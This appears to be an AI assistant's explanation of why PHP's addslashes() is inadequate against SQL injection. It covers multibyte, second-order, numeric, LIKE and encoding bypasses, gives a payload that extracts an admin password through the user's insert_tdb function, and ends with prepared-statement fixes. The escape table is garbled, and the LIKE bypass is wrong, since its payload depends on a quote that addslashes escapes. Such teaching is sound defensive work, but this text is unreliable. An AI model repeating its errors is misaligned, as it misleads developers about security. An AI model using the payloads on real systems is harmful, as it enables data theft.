**addslashes**

Here are the main techniques that demonstrate why addslashes() is insufficient protection:

addslashes() only escapes these characters:

Single quote (') → '
Double quote (") → "
Backslash () → \
NULL byte → \0

----------------------------------------------------
**Common Bypass Techniques**
1. Character Set Vulnerabilities
When using multi-byte character sets (like GBK, Big5):

// Vulnerable code
$input = addslashes($_GET['input']);
$query = "SELECT * FROM users WHERE name = '$input'";

Bypass:

# Input: %bf%27 OR 1=1 --
# After addslashes: %bf%5c%27 OR 1=1 --
# In GBK charset: %bf%5c becomes 縗 (single character)
# Result: SELECT * FROM users WHERE name = '縗' OR 1=1 --'

2. Second-Order SQL Injection
When escaped data is stored and later used without re-escaping:

// First request - data gets stored with escaping
$name = addslashes("O\'Malley"); // Becomes O\'Malley in DB

// Later request - data retrieved and used without escaping
$stored_name = get_from_db(); // O'Malley (unescaped)
$query = "SELECT * FROM logs WHERE user = '$stored_name'"; // Vulnerable!

3. Numeric Context Injection
When injecting into numeric fields without quotes:

$id = addslashes($_GET['id']); // addslashes has no effect on numbers
$query = "SELECT * FROM users WHERE id = $id"; // No quotes around $id

Bypass:

# Input: 1 OR 1=1
# Query becomes: SELECT * FROM users WHERE id = 1 OR 1=1

4. LIKE Clause Bypasses
Using wildcards that aren't escaped by addslashes():

$search = addslashes($_GET['search']);
$query = "SELECT * FROM products WHERE name LIKE '%$search%'";

Bypass:

# Input: %' UNION SELECT password FROM users WHERE '1'='1
# Works because % and _ are not escaped by addslashes()

5. Encoding Bypasses
Using different encodings to bypass filtering:

# URL encoding
%2527 → %27 → ' (after URL decode)

# Unicode encoding
\u0027 → ' (in some contexts)

# Hex encoding
0x27 → ' (in MySQL)

Real-World Example
Looking at your codebase, here's how an attack might work:

// In the vulnerable insert_tdb function
$severity = $_POST['severity']; // No addslashes() applied!
$query = "insert into tdb (...) values (..., '$severity', ...)";

admin_fns.php
Attack payload:

POST data: severity=high', (SELECT password FROM admin_users LIMIT 1), 'fake

Resulting query:

INSERT INTO tdb (...) VALUES (..., 'high', (SELECT password FROM admin_users LIMIT 1), 'fake', ...)

----------------------------------------------------
**Proper Prevention**
Instead of trying to fix addslashes(), use these secure methods:

1. Prepared Statements (Recommended)
$stmt = $conn->prepare("INSERT INTO tdb (title, severity) VALUES (?, ?)");
$stmt->bind_param("ss", $title, $severity);
$stmt->execute();

admin_fns.php
2. Proper Escaping Functions
// Use database-specific escaping
$severity = mysqli_real_escape_string($conn, $_POST['severity']);

// Or PDO quote
$severity = $pdo->quote($_POST['severity']);

3. Input Validation
// Whitelist allowed values
$allowed_severities = ['critical', 'high', 'medium', 'low', 'informational'];
if (!in_array($_POST['severity'], $allowed_severities)) {
    die('Invalid severity');
}

The key takeaway is that addslashes() provides a false sense of security and should never be relied upon for SQL injection prevention. Always use parameterized queries or proper database-specific escaping functions.
